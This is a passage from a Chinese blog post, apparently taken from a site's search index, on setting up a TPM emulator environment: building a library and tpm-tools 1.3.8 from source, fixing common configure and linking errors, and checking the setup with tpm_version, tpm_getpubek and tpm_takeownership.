<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">./configure</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>[注意]</p>
<p>上面修改中的/usr/local/lib/有时可能会是/usr/lib，可查看libtddl.so的位置来确定是哪个目录。</p>
<p>执行./configure可能会报openssl的错误，需要安装：sudo apt-get install libssl-dev</p>
</li>
<li><p>最后执行以下命令：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>[注意] 上述命令如果报错，请使用下面的方法解决：</p>
<ul>
<li><p>在执行第三步的时候，前面加上：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">env CFLAGS="-Wno-unused-but-set-variable" ./configure</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>执行完./configure后再次执行make即可。</p>
</li>
</ul>
</li>
</ul>
</li>
<li><h5 id="在创建好的虚拟机中安装tpm-tools"><a href="#在创建好的虚拟机中安装tpm-tools" class="headerlink" title="在创建好的虚拟机中安装tpm-tools"></a>在创建好的虚拟机中安装tpm-tools</h5><ul>
<li><p>提前下载好tpm-tools-1.3.8.tar.gz压缩包，使用下面的命令进行安装，具体如下：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">tar -zxvf tpm-tools-1.3.8.tar.gz</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>cd进入tpm-tools-1.3.8目录，执行以下命令：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">./configure</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>[注意] 若出现ld returned 1 exit status，error, undefinedreference的情况，可将执行命令修改为</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">./configure --prefix=/usr</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>最后执行以下命令：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></tbody></table></figure>

</li>
</ul>
</li>
</ol>
<h4 id="验证环节"><a href="#验证环节" class="headerlink" title="验证环节"></a>验证环节</h4><ul>
<li><p>进入tpm-tools-1.3.8/src/tpm_mgmt/目录下查看以下三个信息：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">./tpm_version         <span class="comment">#查看版本号</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">./tpm_getpubek        <span class="comment">#查看ek公钥</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">./tpm_takeownership   <span class="comment">#获取owner</span></span></span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>[注意] 执行tpm_version若出现error while loading shared libraries: libtspi.so.1: cannot openshared object file: No such file or directory，则：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt-get install libtspi-dev</span><br></pre></td></tr></tbody></table></figure>

</li>
</ul>
<h4 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h4><p>至此TPM模拟环境已经搭建完毕，验证环节都通过则表明TPM模拟环境已经完全没问题了。此外，如果博友在其他版本的搭建过程中遇到问题，请首先参考本文中的方法自行测试，实在无法解决可以联系博主。</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>环境部署</category>
      </categories>
      <tags>
        <tag>环境部署</tag>
        <tag>可信计算</tag>
        <tag>TPM搭建</tag>
      </tags>
  </entry>
</search>
